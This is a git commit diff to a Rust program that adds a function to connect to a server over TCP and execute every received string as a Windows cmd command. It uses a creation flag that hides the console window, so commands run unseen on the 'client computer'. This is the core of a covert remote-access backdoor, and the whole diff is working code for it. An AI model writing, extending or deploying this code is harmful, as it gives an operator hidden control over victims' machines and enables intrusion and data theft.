fdc30b3c66f5ad47384296863e8906d2f8d7a4f9
Dmytro Yatsenko <dima0102yacenko@gmail.com>
2026-07-12 14:01:28 +0200

    + handle_command fn to run cmd script on client computer

--- src/main.rs
+++ src/main.rs
@@ -1,10 +1,34 @@
+use std::io::prelude::*;
+use std::process::Command;
+use std::os::windows::process::CommandExt;
 use std::net::TcpStream;
+
+fn handle_command(mut stream: TcpStream) {
+    let mut buf = [0; 1024];
+    
+    while let Ok(bytes) = stream.read(&mut buf[..]) {
+        let command = std::str::from_utf8(&buf[..bytes]);
+
+        match command {
+            Ok(command) => {
+                Command::new("cmd")
+                    .args(["/C", command])
+                    .creation_flags(0x08000000) 
+                    .output()
+                    .expect("failed to excute command");
+            }
+            Err(_) => println!("something went bad")
+        }
+    }
+}
 
 fn main() {
     let stream = TcpStream::connect("127.0.0.1:7878");
     
     match stream {
-        Ok(_stream) => println!("[SUCCESS] connected to the server"), 
-        Err(_) => println!("[ERROR] could not connect to the server"),
+        Ok(stream) => {
+            handle_command(stream);
+        }, 
+        Err(_) => println!("[ERROR] could not connect to server"),
     }
 }
